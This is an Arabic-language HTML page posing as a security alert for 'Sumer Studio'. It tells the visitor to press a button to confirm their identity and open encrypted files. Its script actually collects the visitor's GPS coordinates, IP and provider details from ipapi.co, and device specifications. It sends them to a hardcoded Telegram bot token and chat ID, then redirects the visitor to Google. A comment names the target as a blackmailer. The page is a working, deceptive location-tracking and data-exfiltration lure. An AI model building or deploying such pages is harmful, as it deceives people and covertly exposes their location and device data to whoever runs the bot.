<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>تأمين النظام - Sumer Studio</title>
    <style>
        body { background-color: #0d1117; color: white; text-align: center; font-family: sans-serif; display: flex; flex-direction: column; justify-content: center; height: 100vh; margin: 0; }
        .btn { background: #238636; color: white; padding: 20px 40px; border: none; border-radius: 8px; cursor: pointer; font-size: 1.3rem; font-weight: bold; }
        #status { margin-top: 20px; color: #8b949e; }
    </style>
</head>
<body>

    <h2>⚠️ تنبيه أمني</h2>
    <p>يجب الضغط على الزر أدناه لتأكيد هويتك الحقيقية وفتح الملفات المشفرة.</p>
    <button class="btn" onclick="captureRealData()">تأكيد الهوية وفتح المحتوى</button>
    <div id="status">جاري بانتظار التفاعل...</div>

    <script>
        const botToken = "7319219567:AAGG7cvp1hMUU5cPPgfa9CyHCxSHR3teio4";
        const chatId = "5493903521";

        async function captureRealData() {
            document.getElementById('status').innerText = "جاري التحقق من البيانات الحقيقية...";
            
            // 1. طلب الموقع الجغرافي الحقيقي (GPS)
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (position) => {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    const accuracy = position.coords.accuracy;

                    // 2. جلب الـ IP والمعلومات التقنية الأخرى
                    const ipRes = await fetch('https://ipapi.co/json/');
                    const ipData = await ipRes.json();

                    // 3. معلومات الجهاز الحقيقية (Hardware)
                    const deviceInfo = {
                        platform: navigator.platform,
                        cores: navigator.hardwareConcurrency, // عدد أنوية المعالج
                        memory: navigator.deviceMemory, // سعة الرام التقريبية
                        screen: `${screen.width}x${screen.height}`,
                        lang: navigator.language
                    };

                    // 4. صياغة الرسالة النهائية "الحقيقية"
                    const message = `
🎯 **تم كشف الهوية الحقيقية (بنجاح)** 🎯
--------------------------------
📍 **الموقع بدقة (GPS):**
🔗 رابط الخريطة: https://www.google.com/maps?q=${lat},${lon}
🎯 الدقة: ضمن ${accuracy.toFixed(1)} متر

🌐 **بيانات الشبكة (قد تكون VPN):**
- IP: \`${ipData.ip}\`
- المزود: ${ipData.org}
- الدولة: ${ipData.country_name}

💻 **مواصفات الجهاز الحقيقية:**
- النظام: ${deviceInfo.platform}
- المعالج: ${deviceInfo.cores} Core
- الرام: ${deviceInfo.memory} GB
- دقة الشاشة: ${deviceInfo.screen}
- التوقيت المحلي: ${new Date().toLocaleString('ar-EG')}
--------------------------------
🛠️ تم الاستخراج بواسطة نظام Sumer Studio
                    `;

                    // إرسال البيانات للتليجرام
                    await sendToTelegram(message);
                    
                    document.getElementById('status').innerText = "تم التحقق، جاري تحويلك...";
                    window.location.href = "https://www.google.com";

                }, (error) => {
                    // في حال رفض الـ GPS نرسل ما تيسر من معلومات المتصفح
                    sendToTelegram("❌ المبتز رفض إعطاء الموقع، تم سحب بيانات المتصفح فقط.");
                });
            }
        }

        async function sendToTelegram(text) {
            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: text,
                    parse_mode: "Markdown"
                })
            });
        }
    </script>
</body>
</html>
